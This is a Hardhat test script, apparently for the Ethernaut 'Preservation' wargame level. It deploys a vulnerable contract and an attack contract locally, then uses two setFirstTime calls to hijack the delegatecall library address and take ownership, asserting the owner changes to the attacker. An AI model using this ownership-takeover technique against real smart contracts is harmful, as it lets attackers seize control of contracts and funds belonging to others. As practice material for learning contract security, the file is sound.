import { expect } from "chai";
import { ethers } from "hardhat";

describe("Library", function () {
  it("Should change owner", async function () {
    const [_, playerOne, playerTwo] = await ethers.getSigners();

    const Library = await ethers.getContractFactory("Library")
    const library = await Library.connect(playerOne).deploy()
    library.deployed()

    const Preservation = await ethers.getContractFactory("Preservation")
    const preservation = await Preservation.connect(playerOne).deploy(library.address, library.address)
    preservation.deployed()

    // check if current owner is player one
    const firstOwner = await preservation.owner()
    expect(firstOwner).to.equal(playerOne.address)

    // deploy attack
    const Attack = await ethers.getContractFactory("Attack")
    const attack = await Attack.connect(playerTwo).deploy()
    attack.deployed()

    // change the library target
    const setFirstTimeTx = await preservation.setFirstTime(attack.address)
    setFirstTimeTx.wait(1)

    // check if the address is changed
    const timeZone1LibraryAddress = await preservation.timeZone1Library()
    expect(timeZone1LibraryAddress).to.equal(attack.address)

    // attack 
    const attackTx = await preservation.connect(playerTwo).setFirstTime(attack.address)
    attackTx.wait(1)

    // check if the owner changes
    const newOwner = await preservation.owner()
    expect(newOwner).to.equal(playerTwo.address)
  });
});
